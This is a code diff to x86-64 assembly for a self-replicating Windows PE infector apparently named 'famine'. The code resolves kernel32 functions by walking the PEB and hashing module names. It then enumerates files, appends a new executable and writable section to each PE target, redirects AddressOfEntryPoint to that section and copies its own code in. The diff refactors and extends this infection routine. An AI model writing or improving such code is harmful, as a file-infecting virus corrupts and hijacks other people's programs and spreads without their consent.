@@ -2,7 +2,7 @@
 
 section .text
     global start
-    global _get_proc_address
+	global _get_proc_address
 	global _get_address_table
 	global load_function
     global famine
@@ -16,11 +16,14 @@ section .text
 	global _changeDirectory
 	global _verifyDot
 	global _setupNewSection
+	global _clearAndTerminate
 
 ;------------------------------; ***EntryPoint***
 start:
-    ; Align the stack to 16 bytes
-    sub rsp, 0x20
+	nop
+	nop
+	nop
+	nop
     call _saveEntryPoint
     mov rbx, rax
     jmp _get_address_table
@@ -193,7 +196,7 @@ _get_proc_address:
 	mov rdi, rcx
     ; Access PEB
     xor rax, rax
-    mov rax, gs:[0x60]              ; RAX = Address_of_PEB
+    mov rax, QWORD gs:[0x60]              ; RAX = PEB address
     mov rax, [rax + 0x18]           ; RAX = Address_of_LDR
 	mov r10, [rax + 0x10]			; RBX = First entry in InLoadOrderModuleList (PEB_LDR_DATA->InLoadOrderModuleList)
 
@@ -226,8 +229,8 @@ _get_proc_address:
 		; PWSTR  Buffer;				; 8 bytes
 		; } UNICODE_STRING, *PUNICODE_STRING;
 		; dllBase + 0x58 = LDR_DATA_TABLE_ENTRY->BaseDllName
-		mov rcx, [r10 + 0x58 + 0x8] ; rcx = BaseDllName.MaximumLength
-		movzx rdx, word [r10 + 0x58 + 0x2] ; rdx = address of BaseDllName.Buffer
+		mov rcx, [r10 + 0x58 + 0x8] ; rcx = BaseDllName.Buffer
+		movzx rdx, word [r10 + 0x58 + 0x2] ; rdx = BaseDllName.MaxLength
 		call .ror13_hash_dll ; rax = hash of dll
 		mov r11, rax
 
@@ -332,7 +335,7 @@ _get_proc_address:
 		xor r8, r8
 		xor r9, r9
 		.loop_hash_dll:
-			mov al, byte [rcx + r8]	; al = BaseDllName.Buffer[rcx]
+			mov al, byte [rcx + r8]	; al = BaseDllName.Buffer[r8]
 
 			; to upper character
 			cmp al, 0x61 ; compare with 'a'
@@ -407,7 +410,7 @@ famine:
 _alloc_find_data_strust:
     xor rcx, rcx
     mov rdx, rcx
-    add rcx, 0x40
+    add rcx, 0x0040
     add rdx, 328
     call QWORD [ds:r15] ; FindData = LocalAlloc(LPTR, 328)
     mov r14, rax ; r14 = FindData
@@ -418,10 +421,6 @@ _alloc_find_data_strust:
     mov rdx, r14
     call QWORD [ds:r15 + 64] ; FindFirstFileA("*", &FindData)
     mov r13, rax ; r13 = hFindFile
-
-	; cmp r13, -1
-	; je _clearAndTerminate
-
     cmp r12, 1
 	jz	_changeDirectory
 	jmp	_openCurrentFile
@@ -553,9 +552,10 @@ _openCurrentFile:
 ; Registers configuration at this moment:
 ; rbx: this_code entrypoint / rsi: &target_copy / r12: sizeof(this_code) / r13: sizeof(target) / r14: HANDLE hFile / r15: &k32AddressTable
 
-_setupNewSection:
+AddNewSection:
 	xor 	rax, rax
-	xor rcx, rcx
+	mov 	rcx, rax
+
 	mov 	eax, [rsi + 3Ch]
 	add 	rax, rsi ; rax: pointer to the PE header
 
@@ -564,26 +564,10 @@ _setupNewSection:
 	inc cx
 	mov WORD [ds:rax + 6], cx ; number of sections + 1
 
-
 	xor 	rcx, rcx
 	mov cx, WORD [rax + 14h] ; rcx: size of optional header
 	lea rax, [rax + 18h] ; rax: start of optinal header
-
-	add DWORD [rax + 38h], r12d ; update optinalHeader.SizeOfImage
-
-
-	mov r8d, DWORD [rax + 24h] ; rdx: File Alignment
-	mov r9d, DWORD [rax + 20h] ; rdx: Section Alignment
-
-	; ** AddressOfEntryPoint **
-	mov rdx, r13
-	add edx, r9d
-	mov r10d, r9d
-	dec r10d
-	not r10d
-	and edx, r10d
-	mov DWORD [rax + 10h], edx ; update optinalHeader.AddressOfEntryPoint
-
+	mov r11, rax
 
 	lea rax, [rax + rcx] ; rax: start of sections header table
 
@@ -591,46 +575,50 @@ _setupNewSection:
 	imul rcx, rcx, 28h
 	add rax, rcx ; rax: pointer to the end of last section
 
-
 	; --------------------------------------------------------
 	; Here we create the new section
 	; --------------------------------------------------------
 
+_setupSectionValue:
+
 	mov DWORD [rax], 0x65746373 	; mov DWORD [rax], 'sect'
-	mov DWORD [rax + 24h], 0x60000060 ; Characteristics
+	mov DWORD [rax + 24h], 0xE0000000 ; Characteristics
 
 	; ** VirtualAddress **
-	; Find VirtualAddress = align(last section VirtualAddress + last section VirtualSize) 
-	mov edx, DWORD [rax + 8h - 28h] ; rdx: VirtualSize
-	add edx, DWORD [rax + 0Ch - 28h] ; rdx: VirtualSize + VirtualAddress
-	; Align to section alignment
-	add edx, r9d
-	mov r10d, r9d
-	dec r10d
-	not r10d
-	and edx, r10d
-	mov DWORD [rax + 0Ch], edx ; VirtualAddress
+	mov ecx, DWORD [rax + 8h - 28h] ; rdx: VirtualSize
+	add ecx, DWORD [rax + 0Ch - 28h] ; rdx: VirtualSize + VirtualAddress
+	mov edx, DWORD [r11 + 20h]
+	call _align_size
+	mov DWORD [rax + 0Ch], ecx ; VirtualAddress
+	mov DWORD [r11 + 10h], ecx ; AddressOfEntryPoint
 
 	; ** SizeOfRawData **
+	mov ecx, r12d
+	mov edx, DWORD [r11 + 24h] ; file Alignment
+	call _align_size
 	mov DWORD [rax + 10h], r12d ; SizeOfRawData
 
 	; ** VirtualSize **
-	mov edx, r12d
-	add edx, r9d
-	and edx, r10d ; mask with section alignment
-	mov DWORD [rax + 8h], edx ; VirtualSize
+	mov ecx, r12d
+	mov edx, DWORD [r11 + 20h] ; section Alignment
+	call _align_size
+	mov DWORD [rax + 8h], ecx ; VirtualSize
 
 	; ** PointerToRawData **
-	mov edx, DWORD [rax + 14h - 28h] ; rdx : lastsection.PointerToRawData
-	add edx, DWORD [rax + 10h - 28h] ; rdx : lastsection.PointerToRawData + lastsection.SizeOfRawData
-	add edx, r8d
-	dec r8d
-	not r8d
-	and edx, r8d
-	mov DWORD [rax + 14h], r13d ; PointerToRawData
+	mov ecx, DWORD [rax + 14h - 28h] ; rdx : lastsection.PointerToRawData
+	add ecx, DWORD [rax + 10h - 28h] ; rdx : lastsection.PointerToRawData + lastsection.SizeOfRawData
+	mov edx, DWORD [r11 + 24h] ; file Alignment
+	call _align_size
+	mov DWORD [rax + 14h], ecx ; PointerToRawData
 
+	; ** SizeOfImage **
+	mov ecx, DWORD [rax + 0Ch]
+	add ecx, DWORD [rax + 8h]
+	mov edx, DWORD [r11 + 20h]
+	call _align_size 
+	mov DWORD [r11 + 38h], ecx ; update optinalHeader.SizeOfImage + SizeOfRawData
 	; xor 	rax, rax
-	; ; mov 	DWORD [rcx], 0x61636C61		; write signature 'alca'
+	; mov 	DWORD [rcx], 0x61636C61		; write signature 'alca'
 	; add 	rax, 4
 
 _copyShellcode:
@@ -659,6 +647,7 @@ _copyShellcode:
 	mov rcx, r14
 	mov rdx, rbx
 	mov r8, r12
+	add r8, 0x1000
 	xor r9, r9
 	mov QWORD [ss:rsp + 0x20], r9
 	call QWORD [ds:r15 + 48]
@@ -802,5 +791,15 @@ _retrieveDirectoryData:
 _subRax:
 	sub 	rax, 16
 	jmp 	_retrieveDirectoryData
+
+; rcx = value
+; rdx = alignment
+_align_size:
+	dec 	edx
+	add		ecx, edx
+	not 	edx
+	and 	ecx, edx
+	ret
+
 
 end:
